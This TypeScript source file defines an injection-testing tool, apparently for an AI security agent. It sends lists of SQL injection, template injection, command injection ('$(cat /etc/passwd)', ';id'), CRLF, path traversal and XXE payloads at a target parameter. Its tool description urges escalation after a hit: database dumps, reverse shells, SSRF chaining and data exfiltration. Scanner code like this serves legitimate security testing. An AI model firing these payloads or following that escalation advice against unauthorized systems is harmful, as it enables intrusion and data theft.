/**
 * Tool: injection_test
 *
 * Composite injection testing tool. Tests for SQL injection, SSTI, command
 * injection, CRLF injection, LFI, XXE, plus NoSQL and GraphQL injection.
 */

import z from "zod"
import { Tool } from "../../tool/tool"
import { testPayloads, type PayloadPosition } from "../scanner/test-payloads"
import { testNoSql } from "../scanner/nosql-tester"
import { makeToolResultEnvelope } from "./result-envelope"

function slug(value: string) {
  return value.replace(/[^a-z0-9]+/gi, "-").replace(/^-+|-+$/g, "").toLowerCase()
}

function family(type: string) {
  if (type === "sqli") return "sql_injection"
  if (type === "nosql") return "nosql_injection"
  return type
}

function severity(type: string) {
  if (type === "sqli" || type === "nosql" || type === "cmdi" || type === "xxe") return "high"
  if (type === "lfi" || type === "ssti") return "high"
  if (type === "crlf") return "medium"
  return "medium"
}

const DESCRIPTION = `Test a URL/parameter for injection vulnerabilities. Covers:
- SQL injection (error-based, boolean-based, time-based)
- Server-Side Template Injection (SSTI)
- Command injection (OS command execution)
- CRLF injection (HTTP response splitting)
- Local File Inclusion (LFI / path traversal)
- XXE (XML external entity injection)
- NoSQL injection (MongoDB operator injection)

Requires: target URL, parameter name, and injection position.

CHAIN POTENTIAL: If injection succeeds, try to:
- Extract sensitive data (database dumps, /etc/passwd, config files)
- Escalate via command injection → reverse shell
- Chain with SSRF for internal network access
- Use data exfiltration to prove business impact`

// Payload sets for each injection type
const SQLI_PAYLOADS = [
  "' OR '1'='1", "' OR '1'='1'--", "\" OR \"1\"=\"1\"", "1' OR 1=1--",
  "admin'--", "1; DROP TABLE--", "' UNION SELECT NULL--",
  "' UNION SELECT 1,2,3--", "') OR ('1'='1",
  "1' AND SLEEP(5)--", "1' WAITFOR DELAY '0:0:5'--",
  "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
]
const SQLI_SUCCESS = ["sql", "syntax", "mysql", "postgresql", "sqlite", "oracle", "odbc", "you have an error", "warning:", "unclosed quotation", "unterminated"]

const SSTI_PAYLOADS = [
  "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{7*7}", "{{config}}", "{{self}}", "{{''.__class__}}",
  "${T(java.lang.Runtime).getRuntime()}", "{{request.application.__globals__}}",
]
const SSTI_SUCCESS = ["49", "config", "class", "Runtime", "__globals__"]

const CMDI_PAYLOADS = [
  ";id", "|id", "$(id)", "`id`", ";cat /etc/passwd", "|cat /etc/passwd",
  "$(cat /etc/passwd)", ";whoami", "|whoami", "&&whoami",
  ";ping -c 1 127.0.0.1", "|ping -c 1 127.0.0.1",
]
const CMDI_SUCCESS = ["uid=", "root:", "www-data", "nobody:", "bin/bash"]

const CRLF_PAYLOADS = [
  "%0d%0aSet-Cookie:numasec=1", "%0d%0aX-Injected:numasec",
  "\r\nSet-Cookie:numasec=1", "%0aX-Injected:numasec",
  "%E5%98%8D%E5%98%8ASet-Cookie:numasec=1",
]
const CRLF_SUCCESS = ["numasec=1", "x-injected: numasec"]

const LFI_PAYLOADS = [
  "../../../etc/passwd", "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
  "/etc/passwd%00", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
  "php://filter/convert.base64-encode/resource=index.php",
  "file:///etc/passwd",
]
const LFI_SUCCESS = ["root:", "[boot loader]", "localhost", "<?php", "PD9waH"]

const XXE_PAYLOADS = [
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
]
const XXE_SUCCESS = ["root:", "localhost"]

export const InjectionTestTool = Tool.define("injection_test", {
  description: DESCRIPTION,
  parameters: z.object({
    url: z.string().describe("Target URL"),
    parameter: z.string().describe("Parameter name to test"),
    position: z
      .enum(["query", "body", "header", "path", "cookie", "json"])
      .default("query")
      .describe("Where to inject payloads"),
    types: z
      .array(z.enum(["sqli", "ssti", "cmdi", "crlf", "lfi", "xxe", "nosql"]))
      .optional()
      .describe("Injection types to test (default: all)"),
    method: z.enum(["GET", "POST", "PUT", "PATCH"]).optional().describe("HTTP method"),
    headers: z.record(z.string(), z.string()).optional().describe("Extra headers"),
    cookies: z.string().optional().describe("Cookie header"),
    body: z.string().optional().describe("Base request body"),
  }),
  async execute(params, ctx) {
    await ctx.ask({
      permission: "injection_test",
      patterns: [params.url],
      always: [] as string[],
      metadata: { url: params.url, parameter: params.parameter, types: params.types } as Record<string, any>,
    })

    const types = params.types ?? ["sqli", "ssti", "cmdi", "crlf", "lfi", "xxe", "nosql"]
    const results: string[] = []
    let totalVulnerable = 0
    const findings: { type: string; payload: string; evidence: string }[] = []
    const artifacts: Record<string, any>[] = []
    const verifications: Record<string, any>[] = []

    const testConfig = {
      url: params.url,
      method: params.method,
      parameter: params.parameter,
      position: params.position as PayloadPosition,
      headers: params.headers,
      cookies: params.cookies,
      baseBody: params.body,
      concurrency: 3,
    }

    const testSets: Record<string, { payloads: string[]; indicators: string[]; label: string }> = {
      sqli: { payloads: SQLI_PAYLOADS, indicators: SQLI_SUCCESS, label: "SQL Injection" },
      ssti: { payloads: SSTI_PAYLOADS, indicators: SSTI_SUCCESS, label: "SSTI" },
      cmdi: { payloads: CMDI_PAYLOADS, indicators: CMDI_SUCCESS, label: "Command Injection" },
      crlf: { payloads: CRLF_PAYLOADS, indicators: CRLF_SUCCESS, label: "CRLF Injection" },
      lfi: { payloads: LFI_PAYLOADS, indicators: LFI_SUCCESS, label: "LFI / Path Traversal" },
      xxe: { payloads: XXE_PAYLOADS, indicators: XXE_SUCCESS, label: "XXE" },
    }

    for (const type of types) {
      if (type === "nosql") {
        const position =
          params.position === "query"
            ? "query"
            : params.position === "body" || params.position === "json"
              ? "json"
              : undefined
        if (!position) {
          results.push(`\n── NoSQL Injection: skipped (unsupported position ${params.position}) ──`)
          continue
        }
        ctx.metadata({ title: `Testing NoSQL injection on ${params.parameter}...` })
        const nosqlResult = await testNoSql(params.url, {
          parameters: [params.parameter],
          position,
          method: params.method,
          headers: params.headers,
          cookies: params.cookies,
          jsonBody: params.body ? JSON.parse(params.body) : undefined,
          sessionID: ctx.sessionID,
        })
        if (nosqlResult.vulnerable) {
          totalVulnerable++
          results.push(`\n── ⚠ NoSQL Injection: VULNERABLE ──`)
          for (const f of nosqlResult.findings) {
            results.push(`  Technique: ${f.technique}`)
            results.push(`  Payload: ${f.payload}`)
            results.push(`  Evidence: ${f.evidence}`)
            findings.push({ type: "nosql", payload: f.payload, evidence: f.evidence })
            const item = `nosql-${slug(f.technique)}-${slug(f.payload).slice(0, 40)}`
            artifacts.push({
              key: item,
              subtype: "scanner_result",
              family: "nosql_injection",
              technique: f.technique,
              payload: f.payload,
              evidence: f.evidence,
              url: params.url,
              parameter: params.parameter,
              position: f.position,
            })
            verifications.push({
              key: `${item}-verified`,
              family: "nosql_injection",
              kind: "operator_injection",
              title: `NoSQL injection indicated on ${params.parameter}`,
              technical_severity: "high",
              passed: true,
              control: "positive",
              url: params.url,
              method: params.method ?? "GET",
              parameter: params.parameter,
              payload: f.payload,
              evidence: f.evidence,
              evidence_keys: [item],
            })
          }
        } else {
          results.push(`\n── NoSQL Injection: not vulnerable (${nosqlResult.testedCount} payloads) ──`)
        }
        continue
      }

      const set = testSets[type]
      if (!set) continue

      ctx.metadata({ title: `Testing ${set.label} on ${params.parameter}...` })
      const scanResult = await testPayloads({
        ...testConfig,
        sessionID: ctx.sessionID,
        payloads: set.payloads,
        successIndicators: set.indicators,
        matchOn5xx: type !== "crlf",
      })

        if (scanResult.vulnerable) {
          totalVulnerable++
          const vulnResults = scanResult.results.filter((r) => r.vulnerable)
          results.push(`\n── ⚠ ${set.label}: VULNERABLE ──`)
          for (const r of vulnResults) {
            results.push(`  Payload: ${r.payload}`)
            results.push(`  Evidence: ${r.evidence}`)
            results.push(`  Match: ${r.matchType} | Status: ${r.status} | Time: ${r.elapsed}ms`)
            findings.push({ type, payload: r.payload, evidence: r.evidence })
            const item = `${type}-${slug(r.payload).slice(0, 40)}-${r.matchType}`
            artifacts.push({
              key: item,
              subtype: "scanner_result",
              family: family(type),
              payload: r.payload,
              evidence: r.evidence,
              status: r.status,
              elapsed: r.elapsed,
              match_type: r.matchType,
              url: params.url,
              parameter: params.parameter,
              position: params.position,
            })
            verifications.push({
              key: `${item}-verified`,
              family: family(type),
              kind: r.matchType === "timing" ? "timing_signal" : "payload_signal",
              title: `${set.label} indicated on ${params.parameter}`,
              technical_severity: severity(type),
              passed: true,
              control: "positive",
              url: params.url,
              method: params.method ?? "GET",
              parameter: params.parameter,
              payload: r.payload,
              evidence: r.evidence,
              evidence_keys: [item],
            })
          }
        } else {
        results.push(`\n── ${set.label}: not vulnerable (${scanResult.testedCount} payloads) ──`)
      }
    }

    return {
      title: totalVulnerable > 0
        ? `⚠ ${totalVulnerable} injection type(s) found on ${params.parameter}`
        : `No injections found on ${params.parameter}`,
      metadata: { vulnerable: totalVulnerable, findings: findings.length, testedTypes: types.length } as any,
      envelope: makeToolResultEnvelope({
        status: "ok",
        artifacts,
        verifications,
        metrics: {
          vulnerable_types: totalVulnerable,
          findings: findings.length,
          tested_types: types.length,
        },
      }),
      output: results.join("\n"),
    }
  },
})
